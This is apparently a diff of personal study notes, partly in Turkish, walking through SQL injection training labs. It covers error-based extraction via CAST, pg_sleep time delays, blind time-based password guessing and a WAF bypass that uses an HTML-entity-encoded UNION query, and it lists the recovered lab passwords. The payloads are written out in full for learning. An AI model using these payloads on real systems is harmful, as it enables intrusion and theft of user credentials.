@@ -165,3 +165,58 @@ iqjcld9aci6sexljtive
 | 18   | i     |
 | 19   | v     |
 | 20   | e     |
+
+#### 13.Lab: Visible error-based SQL injection
+
+Bu labda hatalı bir syntax girdiğimizde hatayı gösteriyor. Biraz zorladığımızda tüm sorguyu bile alabiliyoruz:
+`Unterminated string literal started at position 48 in SQL SELECT * FROM tracking WHERE id = 'kale' And -as-'. Expected  char`
+![[Pasted image 20250323170231.png]]
+
+burada char beklendiğini görüyoruz. Peki char bekleyen bu sorgudan nasıl yararlanabiliriz? yukarıda gösterildiği gibi invalid bir tip girilince dönülen sorguyu veriyor. Bunu da istediğimiz veriyi int gibi başka bir veri tipine cast ederek yapabiliriz. 
+
+`TrackingId='And 1=cast((select username from users limit 1)as int)--`
+
+yukarıdaki sorguyu yapınca bize aşağıdaki hatayı dönüyor
+`ERROR: invalid input syntax for type integer: "administrator"`
+bu da ilk sırada administrator olduğunu söylüyor. Diğer sıralardaki verileri sorgulamak için `Limit 1 offset 1` gibi bir ifade yazarak elde edebiliriz. ardından aşağıdaki sorgu ile şifreyi elde ediyoruz:
+
+`TrackingId='And 1=cast((select password from users limit 1)as int)--`
+
+`ERROR: invalid input syntax for type integer: "b9ber907ricbru6ge6op"`
+
+şifre : `b9ber907ricbru6ge6op`
+
+#### 14.Lab: Blind SQL injection with time delays
+
+In this lab we were asked to cause a time delay. So I tried time delay payloads from the sql cheat sheet. I found put that pg_sleep works so it meant that the server is postgre sql.
+
+we simply write `'|| pg_sleep(10) --` tp solve the lab
+
+#### 15.Lab: Blind SQL injection with time delays and information retrieval
+
+Bu labda bizden time delay kullanarak şifre bulmamız isteniyor.
+password length bul delay düştüğünde şifre lenght bulundu 20
+TrackingId=x'%3BSELECT CASE WHEN (username = 'administrator' And length(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END from users --
+
+intrudera at halletsin
+TrackingId=x'%3BSELECT CASE WHEN (username = 'administrator' And substring(password,1,1)='A') THEN pg_sleep(10) ELSE pg_sleep(0) END from users --
+
+şifre: fsmsxiwmnkbzmscpfpcf
+
+16 Pro
+17 Pro
+
+Note: Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL injection.
+
+
+#### 18.Lab: SQL injection with filter bypass via XML encoding
+
+Stock check özelliği SQL injection zaafiiyeti var. Bunu kullanmak için xml kısmında sql querry yazıyoruz. Ama WAF bizi engelliyor, biz de bunu geçmek için HTML encoding kullannıyoruz.
+
+SQL querry:
+3 UNION Select concat(password,' ',username) from users
+
+Encoded querry: 
+&#x33;&#x20;&#x55;&#x4E;&#x49;&#x4F;&#x4E;&#x20;&#x53;&#x65;&#x6C;&#x65;&#x63;&#x74;&#x20;&#x63;&#x6F;&#x6E;&#x63;&#x61;&#x74;&#x28;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x2C;&#x27;&#x20;&#x27;&#x2C;&#x75;&#x73;&#x65;&#x72;&#x6E;&#x61;&#x6D;&#x65;&#x29;&#x20;&#x66;&#x72;&#x6F;&#x6D;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#xA;&#xA;
+
+şifre: r27eewp1b9jxg7kuce6g
